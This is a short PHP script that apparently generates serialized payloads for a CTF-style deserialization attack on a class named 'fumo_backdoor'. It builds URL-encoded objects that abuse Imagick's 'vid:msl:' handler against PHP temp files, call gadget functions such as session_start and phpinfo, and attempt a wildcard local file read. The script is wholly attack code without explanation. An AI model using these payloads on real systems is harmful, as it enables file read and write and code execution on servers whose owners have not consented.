<?php
readfile("file:///*");

class fumo_backdoor {
    public $path = null;
    public $argv = null;
    public $func = null;
    public $class = null;
}

$o = new Fumo_backdoor();
$o->path = null;
$o->argv = "vid:msl:/tmp/php*";
$o->func = null;
$o->class = "imagick";
var_dump(urlencode(serialize($o)));

$o = new Fumo_backdoor();
$o->path = null;
$o->argv = null;
$o->func = "session_start";
$o->class = null;
var_dump(urlencode(serialize($o)));

$o = new Fumo_backdoor();
$o->path = "./test1";
$o->argv = null;
$o->func = null;
$o->class = null;
var_dump(serialize($o));

$o = new Fumo_backdoor();
$o->path = null;
$o->argv = null;
$o->func = "phpinfo";
$o->class = null;
var_dump(urlencode(serialize($o)));